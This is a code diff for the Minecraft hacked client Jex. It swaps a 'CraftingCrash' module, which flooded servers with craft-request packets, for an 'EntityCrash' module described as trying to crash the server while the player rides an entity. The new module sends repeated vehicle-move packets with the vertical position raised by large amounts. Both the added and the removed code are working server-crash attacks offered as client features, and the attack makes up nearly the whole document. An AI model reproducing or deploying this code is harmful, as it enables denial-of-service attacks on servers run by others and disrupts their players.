@@ -11,47 +11,43 @@ import me.dustin.jex.feature.option.annotate.Op;
 import me.dustin.jex.helper.misc.ChatHelper;
 import me.dustin.jex.helper.misc.Wrapper;
 import me.dustin.jex.helper.network.NetworkHelper;
-import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
-import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
-import net.minecraft.recipe.Recipe;
-import net.minecraft.screen.CraftingScreenHandler;
+import net.minecraft.entity.Entity;
+import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
+import net.minecraft.util.math.Vec3d;
 
-import java.util.List;
+@Feature.Manifest(category = Feature.Category.MISC, description = "Tries to crash the server when you are riding an entity. (By 0x150)")
+public class EntityCrash extends Feature {
 
-@Feature.Manifest(category = Feature.Category.MISC, description = "Spam craft request packets. Use with planks in inventory for best results.")
-public class CraftingCrash extends Feature {
-
+    @Op(name = "Speed", min = 1, max = 10000, inc = 100)
+    public int speed = 1400;
     @Op(name = "Packet Count", min = 1, max = 50, inc = 1)
     public int packetCount = 24;
     @Op(name = "Auto Disable")
     public boolean autoDisable = true;
 
-    public CraftingCrash() {
+    public EntityCrash() {
         setFeatureCategory(Category.valueOf("CRASH"));
     }
 
     @EventPointer
     private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
-        if (!(Wrapper.INSTANCE.getLocalPlayer().currentScreenHandler instanceof CraftingScreenHandler) || Wrapper.INSTANCE.getMinecraft().getNetworkHandler() == null) return;
-        try {
-            List<RecipeResultCollection> recipeResultCollectionList = Wrapper.INSTANCE.getLocalPlayer().getRecipeBook().getOrderedResults();
-            for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
-                for (Recipe<?> recipe : recipeResultCollection.getRecipes(true)) {
-                    for (int i = 0; i < packetCount; i++) {
-                        NetworkHelper.INSTANCE.sendPacket(new CraftRequestC2SPacket(Wrapper.INSTANCE.getLocalPlayer().currentScreenHandler.syncId, recipe, true));
-                    }
-                }
-            }
-        } catch (Exception ignored) {
-            ChatHelper.INSTANCE.addClientMessage("Stopping crash because an error occurred!");
+        Entity entity = Wrapper.INSTANCE.getLocalPlayer().getVehicle();
+        if (entity == null) {
+            ChatHelper.INSTANCE.addClientMessage("ERROR! You must be riding an entity for this!");
             setState(false);
+            return;
+        }
+        for (int i = 0; i < packetCount; i++) {
+            Vec3d v = entity.getPos();
+            entity.setPos(v.x, v.y + speed, v.z);
+            VehicleMoveC2SPacket packet = new VehicleMoveC2SPacket(entity);
+            NetworkHelper.INSTANCE.sendPacket(packet);
         }
     }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));
-
 
     @EventPointer
     private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
         if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
             setState(false);
-    }, new TickFilter(EventTick.Mode.POST));
+    }, new TickFilter(EventTick.Mode.PRE));
 }
